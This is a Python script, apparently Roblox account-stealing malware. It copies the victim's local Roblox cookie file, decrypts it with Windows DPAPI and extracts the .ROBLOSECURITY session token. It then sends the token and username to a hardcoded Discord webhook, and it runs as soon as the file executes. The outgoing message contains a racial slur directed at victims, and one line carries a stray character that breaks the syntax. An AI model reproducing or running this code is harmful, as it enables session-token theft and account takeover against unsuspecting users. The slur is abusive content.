import os
import shutil
import json
import base64
import win32crypt
import requests

def retrieve_roblox_cookies():
    user_profile = os.getenv("USERPROFILE", "")
    roblox_cookies_path = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")

    if not os.path.exists(roblox_cookies_path):
        return

    temp_dir = os.getenv("TEMP", "")
    destination_path = os.path.join(temp_dir, "RobloxCookies.dat")
    shutil.copy(roblox_cookies_path, destination_path)

    with open(destination_path, 'r', encoding='utf-8') as file:
        try:
            file_content = json.load(file)

            encoded_cookies = file_content.get("CookiesData", "")

            if encoded_cookies:
                decoded_cookies = base64.b64decode(encoded_cookies)

                try:
                    decrypted_cookies = win32crypt.CryptUnprotectData(decoded_cookies, None, None, None, 0)[1]
                    cookie_result = decrypted_cookies.decode('utf-8', errors='ignore')s

                    try:
                        user_info_req = requests.get("https://users.roblox.com/v1/users/authenticated", cookies={".ROBLOSECURITY": cookie_result.split(".ROBLOSECURITY=")[-1].strip(";")})
                        user_data = user_info_req.json()
                        roblox_username = user_data.get("name", "Bilinmiyor")
                    except:
                        roblox_username = "n/a"

                    webhook_url = "https://discordapp.com/api/webhooks/1518883589842931883/Mhg0BBmPFYnQfl2ROPDEvfHbzvZbAPDeKPi8ISGtMnFh3cxhthP2eX9U5g3LODYbH8l-"
                    payload = {
                        "content": f"New Stupid Nigga: {roblox_username}\n\nCookie: {cookie_result}"
                    }
                    requests.post(webhook_url, json=payload)
                except Exception as e:
                    print(f"Error decrypting with DPAPI: {e}")
            else:
                print("Error: No 'CookiesData' found in the file.")

        except json.JSONDecodeError as e:
            print(f"Error while parsing JSON: {e}")
        except Exception as e:
            print(f"Error: {e}")

retrieve_roblox_cookies()
